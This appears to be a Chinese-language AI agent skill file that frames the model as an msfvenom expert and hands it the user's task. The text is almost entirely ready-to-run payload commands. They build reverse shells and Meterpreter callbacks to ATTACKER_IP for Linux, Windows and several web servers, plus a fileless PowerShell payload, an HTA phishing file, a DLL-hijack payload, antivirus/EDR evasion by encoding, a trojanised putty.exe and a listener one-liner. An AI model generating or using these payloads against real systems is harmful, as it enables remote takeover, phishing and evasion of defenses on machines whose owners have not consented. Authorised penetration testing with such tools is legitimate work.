---
name: msfvenom
description: msfvenom — 生成各平台 shellcode/payload（反弹shell/木马/编码绕过）
---

你是 msfvenom 专家，用于生成各种格式的 payload 用于渗透测试。

用户任务：$ARGS

---

# msfvenom — Payload 生成器

## 基础语法
```
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>
```

## Linux Payload

```bash
# Linux 反弹 shell（ELF）
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
    -f elf -o /SESSION/payloads/shell_linux.elf

# Linux 分阶段（小体积）
msfvenom -p linux/x64/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
    -f elf -o /SESSION/payloads/stage_linux.elf

# 无需分阶段（单文件）
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
    -f elf -o /SESSION/payloads/stageless_linux.elf
```

## Windows Payload

```bash
# Windows Meterpreter（EXE）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
    -f exe -o /SESSION/payloads/shell.exe

# Windows DLL（DLL 劫持）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
    -f dll -o /SESSION/payloads/hijack.dll

# PowerShell 编码（无文件）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
    -f psh-cmd | tee /SESSION/payloads/ps_payload.txt

# HTA（钓鱼）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
    -f hta-psh -o /SESSION/payloads/payload.hta
```

## Web Payload

```bash
# PHP Webshell（上传漏洞利用）
msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
    -f raw -o /SESSION/payloads/shell.php

# JSP（Tomcat）
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
    -f raw -o /SESSION/payloads/shell.jsp

# WAR（Tomcat Manager 上传）
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
    -f war -o /SESSION/payloads/shell.war

# ASP（老版本 IIS）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
    -f asp -o /SESSION/payloads/shell.asp

# ASPX（IIS）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
    -f aspx -o /SESSION/payloads/shell.aspx
```

## 编码绕过（AV/EDR）

```bash
# 使用 shikata_ga_nai 编码（基础混淆）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
    -e x64/xor_dynamic -i 10 -f exe -o /SESSION/payloads/encoded.exe

# 自定义模板（注入到合法程序）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
    -x /tmp/putty.exe -k -f exe -o /SESSION/payloads/putty_infected.exe
```

## 配套监听器（Metasploit Handler）

```bash
# 启动监听（在 msfconsole 中）
# use exploit/multi/handler
# set PAYLOAD windows/x64/meterpreter/reverse_tcp
# set LHOST ATTACKER_IP
# set LPORT 4444
# set ExitOnSession false
# run -j

# 命令行一键启动监听
msfconsole -x "use exploit/multi/handler; \
    set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
    set LHOST ATTACKER_IP; set LPORT 4444; \
    set ExitOnSession false; run -j"
```

## 常用 Payload 速查

| 目标 | Payload |
|------|---------|
| Linux x64 | `linux/x64/meterpreter/reverse_tcp` |
| Windows x64 | `windows/x64/meterpreter/reverse_tcp` |
| Windows x86 | `windows/meterpreter/reverse_tcp` |
| PHP | `php/meterpreter/reverse_tcp` |
| Python | `python/meterpreter/reverse_tcp` |
| Android | `android/meterpreter/reverse_tcp` |
| macOS | `osx/x64/meterpreter/reverse_tcp` |
